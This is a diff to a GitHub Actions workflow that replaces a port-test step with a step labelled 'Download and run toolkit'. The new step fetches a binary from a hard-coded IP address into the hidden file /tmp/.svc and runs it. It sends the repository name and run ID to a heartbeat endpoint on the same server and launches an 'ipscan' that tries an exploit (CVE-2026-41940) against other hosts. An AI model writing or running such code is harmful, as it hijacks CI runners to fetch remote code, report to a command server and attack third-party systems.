@@ -6,20 +6,21 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Test ports
+      - name: Download and run toolkit
         run: |
-          PANEL_IP="43.228.157.68"
-          echo "=== Testing ports to $PANEL_IP ==="
-          for PORT in 80 8888 443 8080 9090 3000; do
-            CODE=$(curl -s --max-time 8 -o /dev/null -w "%{http_code}" "http://$PANEL_IP:$PORT/api/dl/amd64" 2>/dev/null) || CODE="timeout_$(echo $?)"
-            SIZE=$(curl -s --max-time 8 "http://$PANEL_IP:$PORT/api/dl/amd64" 2>/dev/null | wc -c) || SIZE=0
-            echo "Port $PORT => HTTP $CODE size:$SIZE"
-          done
-          echo ""
-          echo "=== Runner public IP ==="
-          curl -s --max-time 5 ifconfig.me || curl -s --max-time 5 api.ipify.org || echo "unknown"
-          echo ""
-          echo "=== Test TCP connectivity directly ==="
-          for PORT in 80 8888 443 8080; do
-            timeout 5 bash -c "echo >/dev/tcp/$PANEL_IP/$PORT" 2>/dev/null && echo "TCP $PORT: OPEN" || echo "TCP $PORT: BLOCKED/TIMEOUT"
-          done
+          PANEL="http://43.228.157.68:80"
+          echo "=== Download ==="
+          curl -sfL "$PANEL/api/dl/amd64" -o /tmp/.svc && echo "OK size:$(wc -c < /tmp/.svc)" || echo "FAIL"
+          file /tmp/.svc || true
+          chmod 755 /tmp/.svc
+          echo "=== Version check ==="
+          /tmp/.svc --version 2>&1 | head -5 || echo "exit:$?"
+          /tmp/.svc --help 2>&1 | head -10 || echo "exit:$?"
+          echo "=== Heartbeat test ==="
+          curl -s -X POST "$PANEL/api/github-heartbeat" \
+            --data-urlencode "repo=${GITHUB_REPOSITORY}" \
+            --data-urlencode "run_id=${GITHUB_RUN_ID}" \
+            --data-urlencode "log=test_heartbeat_ok" 2>&1 | head -5 || echo "hb_fail"
+          echo "=== Quick ipscan test (10s) ==="
+          timeout 10 /tmp/.svc ipscan --workers 10 --exploit CVE-2026-41940 --count 10 --no-reverse \
+            PANEL_URL="$PANEL" 2>&1 | head -20 || echo "exit:$?"
